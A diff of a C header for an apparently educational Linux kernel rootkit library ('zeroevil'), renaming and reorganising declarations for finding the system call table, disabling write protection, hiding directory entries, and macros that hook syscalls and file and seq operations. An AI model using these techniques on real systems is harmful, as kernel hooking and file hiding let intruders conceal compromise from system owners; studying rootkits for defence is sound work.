@@ -22,16 +22,80 @@
 # ifndef _GU_ZHENGXIONG_LIB_H
 # define _GU_ZHENGXIONG_LIB_H
 
+
 # ifndef CPP
-# include <linux/fs.h> // filp_open, filp_close.
-# include <linux/proc_fs.h> // PDE_DATA.
+# include <linux/module.h>
+// filp_open, filp_close.
+# include <linux/fs.h>
+// PDE_DATA.
+# include <linux/proc_fs.h>
 // struct seq_file, struct seq_operations.
 # include <linux/seq_file.h>
+// printk.
+# include <linux/printk.h>
 # endif
 
 # include "structs.h"
-# include "printk.h"
 
+
+unsigned long **
+get_sct(void);
+
+unsigned long **
+get_sct_via_sys_close(void);
+
+
+void
+disable_wp(void);
+
+void
+enable_wp(void);
+
+
+void
+print_process_list(void);
+
+void
+print_module_list(void);
+
+
+void
+print_dirent(struct linux_dirent *dirp, long total);
+
+long
+remove_dirent_entry(char *name,
+                    struct linux_dirent *dirp, long total);
+
+
+char *
+join_strings(const char *const *strings, const char *delim,
+             char *buff, size_t count);
+
+void
+print_memory(void *addr, size_t count, const char *prompt);
+
+
+// INFO: ``fn`` is short for ``__func__``.
+# define fn_printk(level, fmt, ...)                     \
+    printk(level "%s: " fmt, __func__, ##__VA_ARGS__)
+
+// INFO: ``fm`` is short for ``__func__`` and ``module``.
+# define fm_printk(level, fmt, ...)                     \
+    printk(level "%s.%s: " fmt,                        \
+           THIS_MODULE->name, __func__, ##__VA_ARGS__)
+
+
+// INFO: I only use ``pr_alert`` at present.
+// TODO: When wanting more, e.g. ``pr_info``, I will add them.
+# define fn_alert(fmt, ...) \
+    fn_printk(KERN_ALERT, fmt, ##__VA_ARGS__)
+
+# define fm_alert(fmt, ...) \
+    fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)
+
+
+// TODO: These two macros depend on your variable naming,
+// which is inconvenient.
 
 # define HOOK_SYS_CALL_TABLE(name)                          \
     do {                                                    \
@@ -61,9 +125,9 @@
                                                                     \
             fm_alert("Changing file_op->" #op " from %p to %p.\n",  \
                      old, new);                                     \
-            disable_write_protection();                             \
+            disable_wp();                             \
             f_op->op = new;                                         \
-            enable_write_protection();                              \
+            enable_wp();                              \
         }                                                           \
     } while (0)
 
@@ -108,37 +172,11 @@
                                                                     \
             fm_alert("Changing seq_op->"#opname" from %p to %p.\n", \
                      old, new);                                     \
-            disable_write_protection();                             \
+            disable_wp();                             \
             seq_op->opname = new;                                   \
-            enable_write_protection();                              \
+            enable_wp();                              \
         }                                                           \
     } while (0)
-
-
-unsigned long **
-get_sys_call_table(void);
-
-
-void
-disable_write_protection(void);
-void
-enable_write_protection(void);
-
-
-char *
-join_strings(const char *const *strings, const char *delim,
-             char *buff, size_t count);
-
-
-void
-print_memory(void *addr, size_t count, const char *prompt);
-
-
-void
-print_dirent(struct linux_dirent *dirp, long total);
-long
-remove_dirent_entry(char *name,
-                    struct linux_dirent *dirp, long total);
 
 
 # endif // zeroevil.h
